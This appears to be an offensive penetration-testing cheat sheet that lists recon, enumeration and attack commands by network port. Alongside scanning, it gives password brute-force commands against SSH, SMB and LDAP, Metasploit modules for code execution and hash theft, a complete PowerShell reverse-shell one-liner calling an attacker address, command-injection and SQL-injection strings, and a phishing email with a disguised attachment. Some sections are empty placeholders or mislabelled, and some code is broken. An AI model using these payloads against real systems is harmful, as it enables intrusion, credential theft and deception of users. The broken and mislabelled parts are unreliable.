# Recon :

```bash
# Enumerate subnet
nmap -sn 10.10.10.1/24
```

```bash
# Fast simple scan
nmap -sS 10.10.10.1/24
```

```sh
export IP=10.10.10.11
```

```bash
# Extracting Live IPs from Nmap Scan
nmap 10.1.1.1 --open -oG scan-results; cat scan-results | grep "/open" | cut -d " " -f 2 > exposed-services-ips

```

```bash
# Full complete slow scan with output
nmap -v -sT -A -T4 -p- -Pn --script vuln -oA full $IP
```

```bash
# Autorecon
python3 autorecon.py $IP
```

```bash
# Scan for UDP
nmap $IP -sU
unicornscan -mU -v -I $IP
```

```
# Connect to udp if one is open
nc -u $IP 48772
```

```
# Responder
responder -I eth0 -A
```

```
# Amass
amass enum $IP
```

```bash
# Generating nice scan report
nmap -sV IP_ADDRESS -oX scan.xml && xsltproc scan.xml -o "`date +%m%d%y`_report.html"
```
```bash
#Simple Port Knocking
for x in 7000 8000 9000; do nmap -Pn –host_timeout 201 –max-retries 0 -p $x 1.1.1.1; done
```


## File enumeration :

### Common :

```bash
# Check real file type
file file.xxx
```

```bash
# Analyze strings
strings file.xxx
strings -a -n 15 file.xxx # Check the entire file and outputs strings longer than 15 chars
```


```bash
# Check embedded files
binwalk file.xxx # Check
binwalk -e file.xxx # Extract
```

```bash
# Check as binary file in hex
ghex file.xxx
```

```bash
# Check metadata
exiftool file.xxx
```

```sh
# Stego tool for multiple formats
wget https://embeddedsw.net/zip/OpenPuff_release.zip
unzip OpenPuff_release.zip -d ./OpenPuff
wine OpenPuff/OpenPuff_release/OpenPuff.exe
```
### Disk files

```sh
# guestmount can mount any kind of disk file
sudo apt-get install libguestfs-tools
guestmount --add yourVirtualDisk.vhdx --inspector --ro /mnt/anydirectory
```

### Images

```sh
#Stego
wget http://www.caesum.com/handbook/Stegsolve.jar -O stegsolve.jar
chmod +x stegsolve.jar
java -jar stegsolve.jar
```

```sh
# Stegpy
stegpy -p file.png
```

```sh
# Check png corrupted
pngcheck -v image.jpeg
```

```sh
# Check what kind of image is
identify -verbose image.jpeg
```

### Audio
```sh
# Check spectrogram
wget https://code.soundsoftware.ac.uk/attachments/download/2561/sonic-visualiser_4.0_amd64.deb
dpkg -i sonic-visualiser_4.0_amd64.deb
```
```sh
#AudioStego
hideme stego.mp3 -f && cat output.txt
```

## Port 7 - Echo tcp/udp

```bash
# Contact Echo service (UDP)
nc -uvn $IP 7
Hello echo    #This is wat you send
Hello echo    #This is the response
```
References :
https://en.wikipedia.org/wiki/ECHO_protocol

## Port 21 - FTP
```bash
nmap --script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 $IP

# Banner Grabbing
telnet -vn $IP 21

# Anonymous login
ftp <IP>
>anonymous
>anonymous
>ls -a # List all files
>binary #Set transmission to binary instead of ascii
>ascii #Set transmission to ascii instead of binary
>bye #exit

# Browser connection
ftp://anonymous:anonymous@10.10.10.xx

# Download all files
wget -m ftp://anonymous:anonymous@$IP #Donwload all
wget -m --no-passive ftp://anonymous:anonymous@$IP #Download all

```

## Port 22 - SSH

```bash
# Enumeration
nc -vn $IP 22

# Public SSH key of server
ssh-keyscan -t rsa $IP -p <PORT>

# BruteForce:

patator ssh_login host=$IP port=22 user=root 0=your_file.txt password=FILE0 -x ignore:mesg='Authentication failed.'

hydra -l user -P /usr/share/wordlists/password/rockyou.txt -e s ssh://10.10.1.111

medusa -h 10.10.1.111 -u user -P /usr/share/wordlists/password/rockyou.txt -e s -M ssh

ncrack --user user -P /usr/share/wordlists/password/rockyou.txt ssh://10.10.1.111

#Msf
use auxiliary/fuzzers/ssh/ssh_version_2

#SSH Enum users < 7.7:

python ssh_user_enum.py --port 2223 --userList /root/Downloads/users.txt $IP 2>/dev/null | grep "is a"

# Tunneling
sudo ssh -L <local_port>:<remote_host>:<remote_port> -N -f <username>@<ip_compromised>

```

https://github.com/six2dez/ssh_enum_script

https://www.exploit-db.com/exploits/45233
### Port 23 - Telnet
```bash
# Banner Grabbing
nc -vn $IP 23

# nmap
nmap -n -sV -Pn --script "*telnet* and safe" -p 23 $IP

```

### Port 25 - Telnet
```sh
# Finding MX servers of an organisation
dig +short mx google.com

# smtps
openssl s_client -starttls smtp -crlf -connect smtp.mailgun.org:587

# Enumeration
nmap -p25 --script smtp-commands $IP
# or use  nmap plugin smtp-ntlm-info.nse
# enum users
msf > auxiliary/scanner/smtp/smtp_enum
smtp-user-enum
nmap –script smtp-enum-users.nse $IP
```
```bash
# Send Email from linux console
[root:~] sendEmail -t itdept@victim.com -f techsupport@bestcomputers.com -s 192.168.8.131 -u Important Upgrade Instructions -a /tmp/BestComputers-UpgradeInstructions.pdf
Reading message body from STDIN because the '-m' option was not used.
If you are manually typing in a message:
  - First line must be received within 60 seconds.
  - End manual input with a CTRL-D on its own line.

IT Dept,

We are sending this important file to all our customers. It contains very important instructions for upgrading and securing your software. Please read and let us know if you have any problems.

Sincerely,
```
### Port 43 - WHOIS
```bash
# Enumerate
whois -h $IP -p <PORT> "domain.tld"
echo "domain.ltd" | nc -vn $IP <PORT>

Also, the WHOIS service always needs to use a database to store and extract the information.
So, a possible SQLInjection could be present when querying the database from some information provided by the user.
For example doing: whois -h 10.10.10.155 -p 43 "a') or 1=1#"
you could be able to extract all the information saved in the database.
```
### Port 53 - DNS
```bash
# nslookup
nslookup
> SERVER <IP_DNS> #Select dns server
> 127.0.0.1 #Reverse lookup of 127.0.0.1, maybe...
> <IP_MACHINE> #Reverse lookup of a machine, maybe...

# DNS lookups, Zone Transfers & Brute-Force
whois domain.com
dig {a|txt|ns|mx} domain.com
dig {a|txt|ns|mx} domain.com @ns1.domain.com
host -t {a|txt|ns|mx} megacorpone.com
host -a megacorpone.com
host -l megacorpone.com ns1.megacorpone.com
dnsrecon -d megacorpone.com -t axfr @ns2.megacorpone.com
dnsenum domain.com
# DNS - Subdomains BF
dnsrecon -D subdomains-1000.txt -d <DOMAIN> -n <IP_DNS>
dnscan -d <domain> -r -w subdomains-1000.txt #Bruteforce subdomains in recursive way, https://github.com/rbsec/dnscan

for sub in $(cat subdomains.txt);do host $sub.domain.com|grep "has.address";done

```

### Port 69 - UDP - TFTP
```bash
nmap -p69 --script=tftp-enum.nse $IP # Or
nmap -n -Pn -sU -p69 -sV --script tftp-enum $IPP
# Download Upload
msf5> auxiliary/admin/tftp/tftp_transfer_util

```
```python
import tftpy
client = tftpy.TftpClient(<ip>, <port>)
client.download("filename in server", "/tmp/filename", timeout=5)
client.upload("filename to upload", "/local/path/file", timeout=5)

```
### Port 79 - Finger
```bash
# Enumeration Banner Grabbing/Basic connection
nc -vn <IP> 79
echo "root" | nc -vn $IP 79

# User enumeration
finger @$IP       #List users
finger admin@$IP  #Get info of user
finger user@$IP   #Get info of user

# msf
use auxiliary/scanner/finger/finger_users

# command exec
finger "|/bin/id@example.com"
finger "|/bin/ls -a /@example.com"

```

### Kerberos - 88

```bash
GET USERS:

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN.LOCAL'" $IP
msf> use auxiliary/gather/kerberos_enumusers

python kerbrute.py -dc-ip IP -users /root/htb/kb_users.txt -passwords /root/pass_common_plus.txt -threads 20 -domain DOMAIN -outputfile kb_extracted_passwords.txt

```
> https://blog.stealthbits.com/extracting-service-account-passwords-with-kerberoasting/
> https://www.youtube.com/watch?v=snGeZlDQL2Q
> https://www.tarlogic.com/blog/como-funciona-kerberos/
> https://www.tarlogic.com/blog/como-atacar-kerberos/

### Port 110 - POP3

```bash
telnet $IP
USER taha@$IP
PASS admin

or:

USER admin
PASS admin
```
### Port 995 / 110 - POP
```bash
# Banner Grabbing
nc -nv $IP 110
openssl s_client -connect $IP:995 -crlf -quiet

# Automated
nmap --scripts "pop3-capabilities or pop3-ntlm-info" -sV -port <PORT> $IP

# POP syntax
POP commands:
  USER uid           Log in as "uid"
  PASS password      Substitue "password" for your actual password
  STAT               List number of messages, total mailbox size
  LIST               List messages and sizes
  RETR n             Show message n
  DELE n             Mark message n for deletion
  RSET               Undo any changes
  QUIT               Logout (expunges messages if no RSET)
  TOP msg n          Show first n lines of message number msg
  CAPA               Get capabilities

```
* http://sunnyoasis.com/services/emailviatelnet.html

### Port 111 - Rpcbind

```bash
# Enumeration
rpcinfo irked.htb # htb hhhh
nmap -sSUC -p111 $IP

rpcinfo -p $IP
rpcclient -U "" $IP
    srvinfo
    enumdomusers
    getdompwinfo
    querydominfo
    netshareenum
    netshareenumall
```
### Port 113 - Ident
```bash
# Nmap
-- By default (-sC) nmap will identify every user of every running port

```
### Port 123 - TNP
```bash
# Enumeration
nmap -sU -sV --script "ntp* and (discovery or vuln) and not (dos or brute)" -p 123 $IP

ntpq -c readlist $IP
ntpq -c readvar $IP
ntpq -c monlist $IP
ntpq -c peers $IP
ntpq -c listpeers $IP
ntpq -c associations $IP
ntpq -c sysinfo $IP

```

### Port 135 - MSRPC

```bash
# Enumeration
nmap $IP --script=msrpc-enum
nmap -n -sV -p 135 --script=msrpc-enum $IP

# Msf
msf > use exploit/windows/dcerpc/ms03_026_dcom
msf > use auxiliary/scanner/dcerpc/endpoint_mapper
msf > use auxiliary/scanner/dcerpc/hidden
msf > use auxiliary/scanner/dcerpc/management
msf > use auxiliary/scanner/dcerpc/tcp_dcerpc_auditor

# Identifying Exposed RPC Services
rpcdump [-p port] $IP
IfId: 5a7b91f8-ff00-11d0-a9b2-00c04fb6e6fc version 1.0
Annotation: Messenger Service
UUID: 00000000-0000-0000-0000-000000000000
Binding: ncadg_ip_udp:192.168.189.1[1028]

rpcdump.py $IP -p 135

```

### Port 139/445 - SMB
```bash
# Enum hostname
enum4linux -n $IP
nmblookup -A $IP
nmap --script=smb-enum* --script-args=unsafe=1 -T5 $IP

# Get Version
smbver.sh $IP
Msfconsole;use scanner/smb/smb_version
ngrep -i -d tap0 's.?a.?m.?b.?a.*[[:digit:]]'
smbclient -L \\\\$IP

# Get Shares
smbmap -H  $IP -R <sharename>
echo exit | smbclient -L \\\\
smbclient \\\\$IP\\<share>
smbclient -L //$IP -N
nmap --script smb-enum-shares -p139,445 -T4 -Pn $IP
smbclient -L \\\\$IP\\

# Check null sessions
smbmap -H $IP
rpcclient -U "" -N $IP
smbclient //$IP/IPC$ -N

# Exploit null sessions
enum -s $IP
enum -U $IP
enum -P $IP
enum4linux -a $IP
/usr/share/doc/python3-impacket/examples/samrdump.py $IP

# Connect to username shares
smbclient //$IP/share -U username

# Connect to share anonymously
smbclient \\\\$IP\\<share>
smbclient //$IP/<share>
smbclient //$IP/<share\ name>
smbclient //$IP/<""share name"">
rpcclient -U " " $IP
rpcclient -U " " -N $IP

# Check vulns
nmap --script smb-vuln* -p139,445 -T4 -Pn $IP

# Check common security concerns
msfconsole -r /usr/share/metasploit-framwork/scripts/resource/smb_checks.rc

# Extra validation
msfconsole -r /usr/share/metasploit-framwork/scripts/resource/smb_validate.rc

# Multi exploits
msfconsole; use exploit/multi/samba/usermap_script; set lhost 192.168.0.X; set rhost $IP; run

# Bruteforce login
medusa -h $IP -u userhere -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt -M smbnt
nmap -p445 --script smb-brute --script-args userdb=userfilehere,passdb=/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt $IP  -vvvv
nmap –script smb-brute $IP

# nmap smb enum & vuln

nmap --script smb-enum-*,smb-vuln-*,smb-ls.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-print-text.nse,smb-psexec.nse,smb-security-mode.nse,smb-server-stats.nse,smb-system-info.nse,smb-protocols -p 139,445 $IP

nmap --script smb-enum-domains.nse,smb-enum-groups.nse,smb-enum-processes.nse,smb-enum-sessions.nse,smb-enum-shares.nse,smb-enum-users.nse,smb-ls.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-print-text.nse,smb-psexec.nse,smb-security-mode.nse,smb-server-stats.nse,smb-system-info.nse,smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-regsvc-dos.nse -p 139,445 $IP

# Mount smb volume linux
mount -t cifs -o username=user,password=password //$IP/share /mnt/share

# rpcclient commands
rpcclient -U "" $IP
    srvinfo
    enumdomusers
    getdompwinfo
    querydominfo
    netshareenum
    netshareenumall

# Run cmd over smb from linux
winexe -U username //$IP "cmd.exe" --system

# smbmap
    #Enum
smbmap.py -H $IP -u administrator -p asdf1234
    #RCE
smbmap.py -u username -p 'P@$$w0rd1234!' -d DOMAINNAME -x 'net group "Domain Admins" /domain' -H $IP
    # Drive Listing
smbmap.py -H $IP -u username -p 'P@$$w0rd1234!' -L
    # Reverse Shell
smbmap.py -u username -p 'P@$$w0rd1234!' -d ABC -H $IP -x 'powershell -command "function ReverseShellClean {if ($c.Connected -eq $true) {$c.Close()}; if ($p.ExitCode -ne $null) {$p.Close()}; exit; };$a=""""192.168.0.X""""; $port=""""4445"""";$c=New-Object system.net.sockets.tcpclient;$c.connect($a,$port) ;$s=$c.GetStream();$nb=New-Object System.Byte[] $c.ReceiveBufferSize  ;$p=New-Object System.Diagnostics.Process  ;$p.StartInfo.FileName=""""cmd.exe""""  ;$p.StartInfo.RedirectStandardInput=1  ;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.UseShellExecute=0  ;$p.Start()  ;$is=$p.StandardInput  ;$os=$p.StandardOutput  ;Start-Sleep 1  ;$e=new-object System.Text.AsciiEncoding  ;while($os.Peek() -ne -1){$out += $e.GetString($os.Read())} $s.Write($e.GetBytes($out),0,$out.Length)  ;$out=$null;$done=$false;while (-not $done) {if ($c.Connected -ne $true) {cleanup} $pos=0;$i=1; while (($i -gt 0) -and ($pos -lt $nb.Length)) { $read=$s.Read($nb,$pos,$nb.Length - $pos); $pos+=$read;if ($pos -and ($nb[0..$($pos-1)] -contains 10)) {break}}  if ($pos -gt 0){ $string=$e.GetString($nb,0,$pos); $is.write($string); start-sleep 1; if ($p.ExitCode -ne $null) {ReverseShellClean} else {  $out=$e.GetString($os.Read());while($os.Peek() -ne -1){ $out += $e.GetString($os.Read());if ($out -eq $string) {$out="""" """"}}  $s.Write($e.GetBytes($out),0,$out.length); $out=$null; $string=$null}} else {ReverseShellClean}};"'

# Check
\Policies\{REG}\MACHINE\Preferences\Groups\Groups.xml look for user&pass "gpp-decrypt "

```
### Port 143 / 993- IMAP
```bash
# Banner grabbing
nc -nv $IP 143
openssl s_client -connect $IP:993 -quiet

# NTLM Auth - Information disclosure
-- use the nmap script imap-ntlm-info.nse

```
### Port 161/162 UDP - SNMP
```bash
nmap -vv -sV -sU -Pn -p 161,162 --script=snmp-netstat,snmp-processes $IP

snmp-check $IP -c public|private|community

snmpwalk -v 2c -c public $ip

```
### Port - 194,6667,6660-7000 - IRC
```bash
# Enumeration
nmap -sV --script irc-botnet-channels,irc-info,irc-unrealircd-backdoor -p 194,6660-7000 irked.htb

```
### Port 264 - Check Point FireWall-1
```bash
msf > use auxiliary/gather/checkpoint_hostname
msf > set RHOST $IP

# read
* https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html#check-point-firewall-1-topology-port-264

```
### LDAP - 389, 636, 3268, 3269

```bash
# Basic Enumeration
nmap -n -sV --script "ldap* and not brute" $IP

# Clear text credentials
* If LDAP is used without SSL you can sniff credentials in plain text in the network.

ldapsearch -h $IP -p 389 -x -b "dc=mywebsite,dc=com"

ldapsearch -x -h $IP -D 'DOMAIN\user' -w 'hash-password'

ldapdomaindump $IP -u 'DOMAIN\user' -p 'hash-password'

ldapsearch -x -h $IP -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Users,DC=<1_SUBDOMAIN>,DC=<TDL>"

#brut

ldapsearch -x -h $IP -D '' -w '' -b "DC=<1_SUBDOMAIN>,DC=<TDL>"
ldapsearch -x -h $IP -D '<DOMAIN>\<username>' -w '<password>' -b "DC=<1_SUBDOMAIN>,DC=<TDL>"

patator ldap_login host=$IP 1=/root/Downloads/passwords_ssh.txt user=hsmith password=FILE1 -x ignore:mesg='Authentication failed.'

# for GUI
Graphical Interface
You can download a graphical interface with LDAP server here:
http://www.jxplorer.org/downloads/users.html

```

### HTTPS - 443
- Read the actual SSL CERT to:
    * find out potential correct vhost to GET
    * is the clock skewed
    * any names that could be usernames for bruteforce/guessing.

```bash
sslscan $IP:443
nmap -sV --script=ssl-heartbleed $IP
```
### Port 500 -  ISAKMP IPsec/IKE VPN
```bash
# enumeration
nmap -sU -p 500

ike-scan $IP
ike-scan -M $IP

```
As you can see in the previous response, there is a field called AUTH with the value PSK.
This means that the vpn is configured using a preshared key (and this is really good for a pentester).
* The value of the last line is also very important: *
*  0 returned handshake; 0 returned notify: This means the target is not an IPsec gateway.
* 1 returned handshake; 0 returned notify: This means the target is configured for IPsec and is willing to perform IKE negotiation, and either one or more of the transforms you proposed are acceptable (a valid transform will be shown in the output)
* 0 returned handshake; 1 returned notify: VPN gateways respond with a notify message when none of the transforms are acceptable (though some gateways do not, in which case further analysis and a revised proposal should be tried).
 Then, in this case we already have a valid transformation but if you are in the 3rd case, then you need to brute-force a little bit to find a valid transformation:
First of all you need to create all the possible transformations:
```bash
for ENC in 1 2 3 4 5 6 7/128 7/192 7/256 8; do for HASH in 1 2 3 4 5 6; do for AUTH in 1 2 3 4 5 6 7 8 64221 64222 64223 64224 65001 65002 65003 65004 65005 65006 65007 65008 65009 65010; do for GROUP in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18; do echo "--trans=$ENC,$HASH,$AUTH,$GROUP" >> ike-dict.txt ;done ;done ;done ;done
```
And then brute-force each one using ike-scan (this can take several minutes):
```bash
while read line; do (echo "Valid trans found: $line" && ike-scan -M $line <IP>) | grep -B14 "1 returned handshake" | grep "Valid trans found" ; done < ike-dict.txt
```
* Reference Material

[PSK cracking paper​](www.ernw.de/download/pskattack.pdf​)
​[SecurityFocus Infocus​](www.securityfocus.com/infocus/1821)
​[Scanning a VPN Implementation​](http://www.radarhack.com/dir/papers/Scanning_ike_with_ikescan.pdf)
### Port 502 - Modbus
```bash
# Enumeration
nmap --script modbus-discover -p 502 $IP
msf> use auxiliary/scanner/scada/modbusdetect
msf> use auxiliary/scanner/scada/modbus_findunitid

```
### Port 512 - Rexec

\x90

### Port 513 - Rlogin
```bash
# login
apt install rsh-client
rlogin -l <USER> $IP

```
### Port 514 - RSH
```bash
# Login
rsh $IP <Command>
rsh $IP -l domain\user <Command>
rsh domain/user@$IP <Command>
rsh domain\\user@$IP <Command>

```
### Port 515 - line printerdaemon LPd
```bash
# The lpdprint tool included in PRET is a minimalist way to print data directly to an LPD capable printer as shown below:
lpdprint.py hostname filename
```
If you want to learn more about [hacking printers read this page.](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)


### 541 - FortiNet SSLVPN
` \x90 `
### Port 548 - Apple Filing Protocol (AFP)
```bash
# enumeration
msf> use auxiliary/scanner/afp/afp_server_info
nmap -sV --script "afp-* and not dos and not brute" -p <PORT> $IP

```
### Port 554 - RTSP

- Web interface, transfer images, streaming
To formulate a Basic authentication element,
one simple has to base 64 encode <username> “:” <password> and add it to the request.
So a new request would look like:
```bash
DESCRIBE rtsp://<ip>:<port> RTSP/1.0\r\nCSeq: 2\r\nAuthorization: Basic YWRtaW46MTIzNA==\r\n\r\n
```
Again note the request is terminated with the double “\r\n”.
The value YWRtaW46MTIzNA== is the base 64 encoded username and password concatenated with “:”.
In this case I have used “admin”/”1234”.
Some simple python scripting to try this out looks like:

```python
import socket
req = "DESCRIBE rtsp://<ip>:<port> RTSP/1.0\r\nCSeq: 2\r\nAuthorization: Basic YWRtaW46MTIzNA==\r\n\r\n"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.1.1", 554))
s.sendall(req)
data = s.recv
print data
# Voila! You have access.
```
```bash
# enumeration
nmap -sV --scripts "rtsp-*" -p 554 $IP

```
> To bruteforce:
 https://github.com/Tek-Security-Group/rtsp_authgrinder

### Port 623 / UDP / TCP - IPMI
```bash
# Enumeration
nmap -n -p 623 10.0.0./24
nmap -n-sU -p 623 10.0.0./24
msf > use  auxiliary/scanner/ipmi/ipmi_version

# version
msf > use auxiliary/scanner/ipmi/ipmi_version

```

### Port 631 - Internet Printing Protocol(IPP)
> The Internet Printing Protocol (IPP) is defined in RFC2910 and RFC2911. It's an extendable protocol, for example ‘IPP Everywhere’ is a candidate for a standard in mobile and cloud printing and IPP extensions for 3D printing have been released.
> Because IPP is based on HTTP, it inherits all existing security features like basic/digest authentication and SSL/TLS encryption. To submit a print job or to retrieve status information from the printer, an HTTP POST request is sent to the IPP server listening on port 631/tcp. A famous open-source IPP implementation is CUPS,
> which is the default printing system in many Linux distributions and OS X. Similar to LPD,
> IPP is a channel to deploy the actual data to be printed and can be abused as a carrier for malicious PostScript or PJL files.

### Port 873 - Rsync
```bash
# Enumeration
nc -vn 127.0.0.1 873
(UNKNOWN) [127.0.0.1] 873 (rsync) open
@RSYNCD: 31.0        <--- You receive this banner with the version from the server
@RSYNCD: 31.0        <--- Then you send the same info
# list                <--- Then you ask the sever to list
raidroot             <--- The server starts enumerating
USBCopy
NAS_Public
_NAS_Recycle_TOSRAID    <--- Enumeration finished
@RSYNCD: EXIT         <--- Sever closes the connection

nmap -sV --script "rsync-list-modules" -p 873 $IP
msf> use auxiliary/scanner/rsync/modules_list

#Example using IPv6 and a different port
rsync -av --list-only rsync://[$IP-V6]:8730

# manual
rsync -av --list-only rsync://$IP/shared_name

```
### Port 1026 - Rusersd
```bash
# Enumeration
apt-get install rusers
rusers -l $IP
Sending broadcast for rusersd protocol version 3...
Sending broadcast for rusersd protocol version 2...
tiff       potatohead:console         Sep  2 13:03   22:03
katykat    potatohead:ttyp5           Sep  1 09:35      14

```

### Port 1028 / 1099 - Java RMI
```bash
# Enumeration

# Basically this service could allow you to execute code.
msf > use auxiliary/scanner/misc/java_rmi_server
msf > use auxiliary/gather/java_rmi_registry
nmap -sV --script "rmi-dumpregistry or rmi-vuln-classloader" -p 1028 $IP

# Reverse Shell
msf > use exploit/multi/browser/java_rmi_connection_impl

```
### Port 1030/1032/1033/1038

- Used by RPC to connect in domain network.

### MSSQL - 1433
```bash
# info

nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <IP>
msf> use auxiliary/scanner/mssql/mssql_ping

nmap -p 1433 -sU --script=ms-sql-info.nse $IP
sqsh -S $IP -U <Username> -P <Password> -D <Database>
# OR
sqsh -S $IP -U sa
    xp_cmdshell 'date'
    go

#msfconsole

#Set USERNAME, RHOSTS and PASSWORD
#Set DOMAIN and USE_WINDOWS_AUTHENT if domain is used

#Steal NTLM
msf> use auxiliary/admin/mssql/mssql_ntlm_stealer #Steal NTLM hash, before executing run Responder

#Info gathering
msf> use admin/mssql/mssql_enum #Security checks
msf> use admin/mssql/mssql_enum_domain_accounts
msf> use admin/mssql/mssql_enum_sql_logins
msf> use auxiliary/admin/mssql/mssql_findandsampledata
msf> use auxiliary/scanner/mssql/mssql_hashdump
msf> use auxiliary/scanner/mssql/mssql_schemadump

#Search for insteresting data
msf> use auxiliary/admin/mssql/mssql_findandsampledata
msf> use auxiliary/admin/mssql/mssql_idf

#Privesc
msf> use exploit/windows/mssql/mssql_linkcrawler
msf> use admin/mssql/mssql_escalate_execute_as #If the user has IMPERSONATION privilege, this will try to escalate
msf> use admin/mssql/mssql_escalate_dbowner #Escalate from db_owner to sysadmin

#Code execution
msf> use admin/mssql/mssql_exec #Execute commands
msf> use exploit/windows/mssql/mssql_payload #Uploads and execute a payload

#Add new admin user from meterpreter session
msf> use windows/manage/mssql_local_auth_bypass

```

### Port 1521 - Oracle
```bash
oscanner -s $IP -P 1521
tnscmd10g version -h $IP
tnscmd10g status -h $IP
nmap -p 1521 -A $IP
nmap -p 1521 --script=oracle-tns-version,oracle-sid-brute,oracle-brute
#MSF
use auxiliary/admin/oracle
use auxiliary/scanner/oracle
```

### Port 1723 - PPTP
```bash
# Enumeration
nmap –Pn -sSV -p1723 $IP

```
### Port 1883 - MQTT (Mosquitto)

To connect to a MQTT service you can use: https://github.com/bapowell/python-mqtt-client-shell
```bash
> connect (NOTICE that you need to indicate before this the params of the connection, by default 127.0.0.1:1883)
> subscribe "#" 1
> subscribe "$SYS/#"

```
Or you could run this code to try to connect to a MQTT service without authentication, subscribe to every topic and listen them:
```python
#This is a modified version of https://github.com/Warflop/IOT-MQTT-Exploit/blob/master/mqtt.py
import paho.mqtt.client as mqtt
import time
import os

HOST = "127.0.0.1"
PORT = 1883

def on_connect(client, userdata, flags, rc):
    client.subscribe('#', qos=1)
    client.subscribe('$SYS/#')

def on_message(client, userdata, message):
    print('Topic: %s | QOS: %s  | Message: %s' % (message.topic, message.qos, message.payload))

def main():
    client = mqtt.Client()
    client.on_connect = on_connect
    client.on_message = on_message
    client.connect(HOST, PORT)
    client.loop_start()
    #time.sleep(10)
    #client.loop_stop()

if __name__ == "__main__":
    main()

```

### Port 2049 - NFS TNS Listener
```bash
# enumeration
# nmap scripts
nfs-ls #List NFS exports and check permissions
nfs-showmount #Like showmount -e
nfs-statfs #Disk statistics and info from NFS share

# msf modul
scanner/nfs/nfsmount #Scan NFS mounts and list permissions

# Mounting
showmount -e $IP
mount -t nfs [-o vers=2] $IP:<remote_folder> <local_folder> -o nolock

```

### Port 2100 - Oracle XML DB
```sh
#FTP
    sys:sys
    scott:tiger
```
 - list of passwords :
https://docs.oracle.com/cd/B10501_01/win.920/a95490/username.htm

### Port 3260 - ISCSI
```bash
# Enumeration
nmap -sV --script=iscsi-info -p 3260 $IP

# Manual enumeration
sudo apt-get install open-iscsi
iscsiadm -m discovery -t sendtargets -p $IP:3260
123.123.123.123:3260,1 iqn.1992-05.com.emc:fl1001433000190000-3-vnxe
[2a01:211:7b7:1223:211:32ff:fea9:fab9]:3260,1 iqn.2000-01.com.synology:asd3.Target-1.d0280fd382
[fe80::211:3232:fab9:1223]:3260,1 iqn.2000-01.com.synology:Oassdx.Target-1.d0280fd382

# Then you catch the 2nd part of the printed string of each line
iscsiadm -m node --targetname="iqn.1992-05.com.emc:fl1001433000190000-3-vnxe" -p 123.123.123.123:3260 --login
Logging in to [iface: default, target: iqn.1992-05.com.emc:fl1001433000190000-3-vnxe, portal: 123.123.123.123,3260] (multiple)
Login to [iface: default, target: iqn.1992-05.com.emc:fl1001433000190000-3-vnxe, portal: 123.123.123.123,3260] successful.

# logout
iscsiadm -m node --targetname="iqn.1992-05.com.emc:fl1001433000190000-3-vnxe" -p 123.123.123.123:3260 --logout

```

### Port 3299 - SAPRouter
Copy of: https://blog.rapid7.com/2014/01/09/piercing-saprouter-with-metasploit/
```bash
msf> use auxiliary/scanner/sap/sap_service_discovery
msf auxiliary(sap_service_discovery) > set RHOSTS $IP
RHOSTS => $IP
msf auxiliary(sap_service_discovery) > run

[*] [SAP] Beginning service Discovery '1.2.3.101'

[+] 1.2.3.101:3299      - SAP Router OPEN
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

msf > use auxiliary/scanner/sap/sap_router_info_request

```

### MySQL - 3306
```bash
# Enumeration
nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 $IP
msf> use auxiliary/scanner/mysql/mysql_version
msf> use uxiliary/scanner/mysql/mysql_authbypass_hashdump
msf> use auxiliary/scanner/mysql/mysql_hashdump #Creds
msf> use auxiliary/admin/mysql/mysql_enum #Creds
msf> use auxiliary/scanner/mysql/mysql_schemadump #Creds
msf> use exploit/windows/mysql/mysql_start_up #Execute commands Windows, Creds

# Connect Remote
mysql -h <Hostname> -u root
mysql -h <Hostname> -u root@localhost

```
### Port 3339 - Oracle web interface

Basic info about web service (apache, nginx, IIS)

### Port 3389 - RDP
```bash
# enum
nmap -p 3389 --script=rdp-vuln-ms12-020.nse $IP
nmap --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -p 3389 -T4 <IP>

# Connect with known credetials/hash
rdesktop -u <username> $IP
rdesktop -d <domain> -u <username> -p <password> $IP
xfreerdp /u:[domain\]<username> /p:<password> /v:$IPP
xfreerdp /u:[domain\]<username> /pth:<hash> /v:$IP

# Check known credentials
rdp_check <domain>\<name>:<password>@$IP

[Post-Exploitation](https://github.com/JoelGMSec/AutoRDPwn)

# Launch CMD with other cretentials so they are used in the network
runas /netonly /user<DOMAIN>\<NAME> "cmd.exe" ::The password will be prompted

```

### Port 3632 - distcc

Resources :

​* https://www.rapid7.com/db/modules/exploit/unix/misc/distcc_exec​
* ​https://gist.github.com/DarkCoderSc/4dbf6229a93e75c3bdf6b467e67a9855​

### Port 4369 - Erlang Port Mapper Daemon (epmd)

```bash
# Enumeration
echo -n -e "\x00\x01\x6e" | nc -vn $IP 4369

# Via Erlang, Download package from here: https://www.erlang-solutions.com/resources/download.html
dpkg -i esl-erlang_23.0-1~ubuntu~xenial_amd64.deb
apt-get install erlang
erl # Once Erlang is installed this will promp an erlang terminal
1> net_adm:names('<HOST>'). # This will return the listen addresses

# Automatic
nmap -sV -Pn -n -T4 -p 4369 --script epmd-info $IP

PORT     STATE SERVICE VERSION
4369/tcp open  epmd    Erlang Port Mapper Daemon
